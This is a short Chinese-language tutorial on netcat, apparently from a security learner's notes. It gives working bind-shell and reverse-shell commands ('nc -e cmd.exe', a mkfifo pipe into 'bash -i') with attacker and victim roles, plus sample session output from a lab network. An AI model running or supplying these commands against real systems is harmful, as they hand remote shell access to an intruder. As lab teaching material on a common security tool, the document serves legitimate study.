## netcat使用

netcat 有很多不同的实现。

下面的链接可以下载到适用于windows的带-e参数的netcat程序

<https://eternallybored.org/misc/netcat/>



### 用到的参数

nc [参数] 主机 端口

-l  指定nc使用监听模式，而不是对指定的主机端口进行连接

-p 端口 指定源端口

-e 文件 指定在建立连接后，运行该文件并将输入输出定向到该文件（有的实现是-c）

-v 让nc提供更多的信息



### 例子



#### 将本机的0.0.0.0:9999绑定一个shell

**有-e参数的情况下**

`nc -lv 9999 -e cmd.exe`

**使用管道符和输入输出重定向来实现绑定(Linux)**

```shell
$ mkfifo /tmp/stdin
$ cat /tmp/stdin | /bin/bash -i 2>&1 | nc -l 0.0.0.0 9999 >/tmp/stdin
```

`mkfifo /tmp/stdin` 的作用是创建一个管道文件。管道文件里的数据读取后就会被清空

`| /bin/bash -i 2>&1` 的作用是将管道文件里的数据作为/bin/bash文件运行的时的输入，指定使用交互模式，并将错误信息stderr定向到stdout

#### 连接对方主机的shell

```shell
$ nc 192.168.247.21 9999
leaf@leaf-vm:/mnt/hgfs/workspace/security/pwn_code/how2heap/test_groud$ ls
ls
house_of_spirit.c
re
```

#### 反弹shell

**在有-e参数的情况下**

首先在攻击者的机器上监听一个端口

`nc -lv 0.0.0.0 7777`

然后在受害者的机器上连接攻击者，并将shell传递过去

`nc 192.168.247.21 7777 -e cmd.exe`

创建连接后，攻击者就会收到一个shell

```
$ nc -lv 0.0.0.0 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from [192.168.247.1] port 7777 [tcp/*] accepted (family 2, sport 8928)
Microsoft Windows [�汾 10.0.17134.799]
(c) 2018 Microsoft Corporation����������Ȩ����

C:\workspace\download\netcat-mingw>dir
dir
 ������ C �еľ��� Windows 10
 �������к��� D835-5B8C

 C:\workspace\download\netcat-mingw ��Ŀ¼

2019/05/27  17:48    <DIR>          .
2019/05/27  17:48    <DIR>          ..
2004/12/28  12:23            12,166 doexec.c
1996/07/09  17:01             7,283 generic.h
1996/11/06  23:40            22,784 getopt.c
1994/11/03  20:07             4,765 getopt.h
1998/02/06  16:50            61,780 hobbit.txt
2004/12/27  18:37            18,009 license.txt
2011/09/17  00:46               300 Makefile
2011/09/17  00:52            38,616 nc.exe
2011/09/17  00:52            45,272 nc64.exe
2011/09/17  00:44            69,850 netcat.c
2011/09/17  00:45             6,885 readme.txt
              11 ���ļ�        287,710 �ֽ�
               2 ��Ŀ¼ 26,625,261,568 �����ֽ�

C:\workspace\download\netcat-mingw>

```



### 参考

mkfifo 命令创建命名管道实现进程之间通信 <https://blog.csdn.net/orangleliu/article/details/49133199>